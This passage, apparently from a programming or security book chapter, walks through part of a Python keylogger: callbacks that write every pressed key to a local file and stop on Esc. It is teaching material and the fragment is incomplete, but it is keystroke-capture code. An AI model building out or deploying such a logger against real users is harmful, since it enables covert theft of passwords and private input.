We will store our logs in this file. Let's take a look at the code:

```
import sys
filename = "keylogs.txt"

file = open(filename, "w")
def onPress(key):
    print(str(key))
    file.write(str(key))

def onRelease(key):
    if str(key) == 'Key.esc':
        file.close()
        sys.exit(0)
```

Here we create a file in write mode and every time a key is pressed, we store the key in the file. Finally, when the Esc key is pressed, we close the file and exit. If you start the program and run it and press some keys, you will see that a new file is created, and all the key logs are stored inside the file. Here is the result of me executing this operation:

![](bbox=[0.115, 0.509, 0.852, 0.831])

Figure 7.9 – Stored keystrokes in a file